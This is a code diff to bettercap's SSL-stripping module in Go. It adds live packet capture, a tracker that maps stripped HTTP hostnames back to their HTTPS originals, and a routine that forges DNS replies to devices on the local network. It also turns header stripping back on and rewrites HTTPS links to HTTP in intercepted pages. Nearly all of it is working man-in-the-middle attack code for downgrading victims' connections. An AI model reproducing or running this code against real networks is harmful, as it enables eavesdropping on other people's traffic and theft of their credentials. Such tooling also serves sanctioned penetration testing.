@@ -3,6 +3,7 @@ package modules
 import (
 	"fmt"
 	"io/ioutil"
+	"net"
 	"net/http"
 	"regexp"
 	"strings"
@@ -10,8 +11,13 @@ import (
 
 	"github.com/bettercap/bettercap/core"
 	"github.com/bettercap/bettercap/log"
+	"github.com/bettercap/bettercap/packets"
+	"github.com/bettercap/bettercap/session"
 
 	"github.com/elazarl/goproxy"
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
+	"github.com/google/gopacket/pcap"
 	"github.com/jpillora/go-tld"
 )
 
@@ -96,15 +102,227 @@ func (t *cookieTracker) Expire(req *http.Request) *http.Response {
 	return redir
 }
 
-type SSLStripper struct {
-	Enabled bool
-	cookies *cookieTracker
+type hostTracker struct {
+	sync.RWMutex
+	hosts map[string]string
 }
 
-func NewSSLStripper(enabled bool) *SSLStripper {
-	return &SSLStripper{
-		Enabled: enabled,
+func NewHostTracker() *hostTracker {
+	return &hostTracker{
+		hosts: make(map[string]string, 0),
+	}
+}
+
+func (t *hostTracker) Track(host, stripped string) {
+	t.Lock()
+	defer t.Unlock()
+	t.hosts[stripped] = host
+}
+
+func (t *hostTracker) Unstrip(stripped string) string {
+	t.RLock()
+	defer t.RUnlock()
+	if original, found := t.hosts[stripped]; found == true {
+		return original
+	}
+	return ""
+}
+
+type SSLStripper struct {
+	enabled       bool
+	session       *session.Session
+	cookies       *cookieTracker
+	hosts         *hostTracker
+	handle        *pcap.Handle
+	pktSourceChan chan gopacket.Packet
+}
+
+func NewSSLStripper(s *session.Session, enabled bool) *SSLStripper {
+	strip := &SSLStripper{
+		enabled: false,
 		cookies: NewCookieTracker(),
+		hosts:   NewHostTracker(),
+		session: s,
+		handle:  nil,
+	}
+	strip.Enable(enabled)
+	return strip
+}
+
+func (s *SSLStripper) Enabled() bool {
+	return s.enabled
+}
+
+func (s *SSLStripper) dnsReply(pkt gopacket.Packet, peth *layers.Ethernet, pudp *layers.UDP, domain string, address net.IP, req *layers.DNS, target net.HardwareAddr) {
+	redir := fmt.Sprintf("(->%s)", address)
+	who := target.String()
+
+	if t, found := s.session.Lan.Get(target.String()); found == true {
+		who = t.String()
+	}
+
+	log.Info("[%s] Sending spoofed DNS reply for %s %s to %s.", core.Green("dns"), core.Red(domain), core.Dim(redir), core.Bold(who))
+
+	var err error
+	var src, dst net.IP
+
+	nlayer := pkt.NetworkLayer()
+	if nlayer == nil {
+		log.Debug("Missing network layer skipping packet.")
+		return
+	}
+
+	var ipv6 bool
+
+	if nlayer.LayerType() == layers.LayerTypeIPv4 {
+		pip := pkt.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
+		src = pip.DstIP
+		dst = pip.SrcIP
+		ipv6 = false
+
+	} else {
+		pip := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
+		src = pip.DstIP
+		dst = pip.SrcIP
+		ipv6 = true
+	}
+
+	eth := layers.Ethernet{
+		SrcMAC:       peth.DstMAC,
+		DstMAC:       target,
+		EthernetType: layers.EthernetTypeIPv6,
+	}
+
+	answers := make([]layers.DNSResourceRecord, 0)
+	for _, q := range req.Questions {
+		answers = append(answers,
+			layers.DNSResourceRecord{
+				Name:  []byte(q.Name),
+				Type:  q.Type,
+				Class: q.Class,
+				TTL:   1024,
+				IP:    address,
+			})
+	}
+
+	dns := layers.DNS{
+		ID:        req.ID,
+		QR:        true,
+		OpCode:    layers.DNSOpCodeQuery,
+		QDCount:   req.QDCount,
+		Questions: req.Questions,
+		Answers:   answers,
+	}
+
+	var raw []byte
+
+	if ipv6 == true {
+		ip6 := layers.IPv6{
+			Version:    6,
+			NextHeader: layers.IPProtocolUDP,
+			HopLimit:   64,
+			SrcIP:      src,
+			DstIP:      dst,
+		}
+
+		udp := layers.UDP{
+			SrcPort: pudp.DstPort,
+			DstPort: pudp.SrcPort,
+		}
+
+		udp.SetNetworkLayerForChecksum(&ip6)
+
+		err, raw = packets.Serialize(&eth, &ip6, &udp, &dns)
+		if err != nil {
+			log.Error("Error serializing packet: %s.", err)
+			return
+		}
+	} else {
+		ip4 := layers.IPv4{
+			Protocol: layers.IPProtocolUDP,
+			Version:  4,
+			TTL:      64,
+			SrcIP:    src,
+			DstIP:    dst,
+		}
+
+		udp := layers.UDP{
+			SrcPort: pudp.DstPort,
+			DstPort: pudp.SrcPort,
+		}
+
+		udp.SetNetworkLayerForChecksum(&ip4)
+
+		err, raw = packets.Serialize(&eth, &ip4, &udp, &dns)
+		if err != nil {
+			log.Error("Error serializing packet: %s.", err)
+			return
+		}
+	}
+
+	log.Debug("Sending %d bytes of packet ...", len(raw))
+	if err := s.session.Queue.Send(raw); err != nil {
+		log.Error("Error sending packet: %s", err)
+	}
+}
+
+func (s *SSLStripper) onPacket(pkt gopacket.Packet) {
+	typeEth := pkt.Layer(layers.LayerTypeEthernet)
+	typeUDP := pkt.Layer(layers.LayerTypeUDP)
+	if typeEth == nil || typeUDP == nil {
+		return
+	}
+
+	eth := typeEth.(*layers.Ethernet)
+	dns, parsed := pkt.Layer(layers.LayerTypeDNS).(*layers.DNS)
+	if parsed && dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && len(dns.Answers) == 0 {
+		udp := typeUDP.(*layers.UDP)
+		for _, q := range dns.Questions {
+			domain := string(q.Name)
+			original := s.hosts.Unstrip(domain)
+			if original != "" {
+				if address, err := net.LookupIP(original); err == nil && len(address) > 0 {
+					s.dnsReply(pkt, eth, udp, domain, address[0], dns, eth.SrcMAC)
+				} else {
+					log.Error("Could not resolve %s: %s", original, err)
+				}
+			}
+		}
+	}
+}
+
+func (s *SSLStripper) Enable(enabled bool) {
+	s.enabled = enabled
+
+	if enabled == true && s.handle == nil {
+		var err error
+
+		if s.handle, err = pcap.OpenLive(s.session.Interface.Name(), 65536, true, pcap.BlockForever); err != nil {
+			panic(err)
+		}
+
+		if err = s.handle.SetBPFFilter("udp"); err != nil {
+			panic(err)
+		}
+
+		go func() {
+			defer func() {
+				s.handle.Close()
+				s.handle = nil
+			}()
+
+			for s.enabled {
+				src := gopacket.NewPacketSource(s.handle, s.handle.LinkType())
+				s.pktSourceChan = src.Packets()
+				for packet := range s.pktSourceChan {
+					if s.enabled == false {
+						break
+					}
+
+					s.onPacket(packet)
+				}
+			}
+		}()
 	}
 }
 
@@ -143,7 +361,7 @@ func (s *SSLStripper) stripResponseHeaders(res *http.Response) {
 // - making unknown session cookies expire
 // - handling stripped domains
 func (s *SSLStripper) Preprocess(req *http.Request, ctx *goproxy.ProxyCtx) (redir *http.Response) {
-	if s.Enabled == false {
+	if s.enabled == false {
 		return
 	}
 
@@ -197,14 +415,14 @@ func (s *SSLStripper) processURL(url string) string {
 }
 
 func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
-	if s.Enabled == false {
+	if s.enabled == false {
 		return
 	} else if s.isHTML(res) == false {
 		return
 	}
 
 	// process response headers
-	// s.stripResponseHeaders(res)
+	s.stripResponseHeaders(res)
 
 	// fetch the HTML body
 	raw, err := ioutil.ReadAll(res.Body)
@@ -222,7 +440,12 @@ func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
 
 	for url, stripped := range urls {
 		log.Info("Stripping url %s to %s", core.Bold(url), core.Yellow(stripped))
+
 		body = strings.Replace(body, url, stripped, -1)
+
+		hostOriginal := strings.Replace(url, "https://", "", 1)
+		hostStripped := strings.Replace(stripped, "http://", "", 1)
+		s.hosts.Track(hostOriginal, hostStripped)
 	}
 
 	// reset the response body to the original unread state
